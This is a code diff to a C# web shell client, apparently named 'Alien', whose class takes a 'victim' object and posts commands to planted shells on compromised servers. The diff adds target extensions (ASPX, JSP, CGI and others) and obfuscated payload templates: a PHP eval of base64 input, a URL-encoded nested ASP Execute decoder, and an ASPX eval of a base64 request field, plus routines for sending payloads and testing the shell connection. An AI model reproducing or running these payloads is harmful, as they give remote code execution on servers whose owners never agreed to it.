@@ -16,6 +16,12 @@ namespace Alien
         {
             { Language.PHP, "php" },
             { Language.ASP, "asp" },
+            { Language.ASPX, "aspx" },
+            { Language.ASMX, "asmx" },
+            { Language.ASHX, "ashx" },
+            { Language.JSP, "jsp" },
+            { Language.JSPX, "jspx" },
+            { Language.CGI, "cgi" },
             { Language.Python, "py" },
         };
         private Dictionary<Language, string[]> m_dicRemoveSyntax = new Dictionary<Language, string[]>()
@@ -27,14 +33,25 @@ namespace Alien
                     "<?php", "?>",
                 }
             },
+            {
+                Language.ASP,
+                new string[]
+                {
+                    "<%", "%>",
+                }
+            }
         };
         private Dictionary<Language, string> m_dicDecodeFunc = new Dictionary<Language, string>()
         {
             { Language.PHP, "@eval(base64_decode('[PATTERN]'));" },
+            { Language.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
+            { Language.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""[WEncoding]"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
         };
         private Dictionary<Language, string> m_dicSplitter = new Dictionary<Language, string>()
         {
-            { Language.PHP, "echo(\"[SPLITTER]\");" }
+            { Language.PHP, "echo(\"[SPLITTER]\");" },
+            { Language.ASP, "Response.Write(\"[SPLITTER]\");" },
+            { Language.ASPX, "Response.Write(\"[SPLITTER]\");" }
         };
 
         public clsWeb(clsVictim victim)
@@ -48,6 +65,12 @@ namespace Alien
             };
         }
 
+        /// <summary>
+        /// HTTP POST request.
+        /// </summary>
+        /// <param name="szPayloadData"></param>
+        /// <param name="szSplitter"></param>
+        /// <returns></returns>
         public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
         {
             Clipboard.SetText(szPayloadData);
@@ -68,6 +91,10 @@ namespace Alien
             }
         }
 
+        /// <summary>
+        /// Do HTTP web connection to check alive.
+        /// </summary>
+        /// <returns></returns>
         public async Task<bool> fnbTestWebConnection()
         {
             try
@@ -89,6 +116,11 @@ namespace Alien
                 return false;
             }
         }
+
+        /// <summary>
+        /// Execute test payload.
+        /// </summary>
+        /// <returns></returns>
         public async Task<bool> fnbTestShellConnection()
         {
             try
